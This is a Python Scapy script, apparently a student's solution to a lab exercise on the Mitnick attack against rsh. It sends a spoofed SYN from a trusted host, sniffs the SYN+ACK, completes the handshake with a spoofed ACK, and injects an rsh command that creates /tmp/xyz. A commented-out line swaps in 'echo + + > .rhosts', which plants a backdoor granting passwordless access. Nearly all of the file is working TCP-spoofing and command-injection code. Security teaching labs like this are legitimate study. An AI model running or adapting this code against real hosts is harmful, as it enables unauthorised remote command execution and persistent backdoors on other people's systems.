#!/usr/bin/python3
from scapy.all import *
from random import randint
# 'U': URG bit
# 'A': ACK bit
# 'P': PSH bit
# 'R': RST bit
# 'S': SYN bit
# 'F': FIN bit

#task21a
seq_num = 2222 #random
ip=IP(src='172.16.133.130',dst='172.16.133.128')
tcp=TCP(sport=1023,dport=514,flags='S',seq=seq_num)
pkt=ip/tcp
send(pkt,verbose=0)
print('SYN sent!')

x_ip = "172.16.133.128" # X-Terminal
x_port = 514 # Port number used by X-Terminal
srv_ip = "172.16.133.130" # The trusted server
srv_port = 1023 # Port number used by the trusted server
# Add 1 to the sequence number used in the spoofed SYN

def spoof(pkt):
    global seq_num # We will update this global variable in the function
    #global p
    print('sniffed!')
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]
    # Print out debugging information
    tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4 # TCP data length
    print("{}:{} -> {}:{} Flags={} Len={}".format(old_ip.src, old_tcp.sport,
    old_ip.dst, old_tcp.dport, old_tcp.flags, tcp_len))
    # Construct the IP header of the response
    ip = IP(src=srv_ip, dst=x_ip)
    # Check whether it is a SYN+ACK packet or not;
    #tsk21b
    if old_tcp.flags=='SA' and old_tcp.dport==1023:
        seq_num=seq_num+1
        tcp=TCP(sport=srv_port,dport=x_port,flags='A',seq=seq_num,ack=old_tcp.seq+1)
        pkt=ip/tcp
        send(pkt,verbose=0)
        print('A sent!')
    
        
        #data = '9090\x00seed\x00seed\x00echo + + > .rhosts\x00'
        data = '9090\x00seed\x00seed\x00touch /tmp/xyz\x00'
        tcp=TCP(sport=1023,dport=514,flags='PA',seq=seq_num,ack=old_tcp.seq+1)
        send(ip/tcp/data, verbose=0)
        print ('rsh data sent!')

    if old_tcp.flags=='S' and old_tcp.dport==9090:
        tcp=TCP(sport=9090,dport=srv_port,flags='SA',seq=randint(1,65535),ack=old_tcp.seq+1)
        
        pkt=ip/tcp
        send(pkt,verbose=0)
        print('second connection sent!')

myFilter = 'tcp' # You need to make the filter more specific
sniff(filter=myFilter, prn=spoof)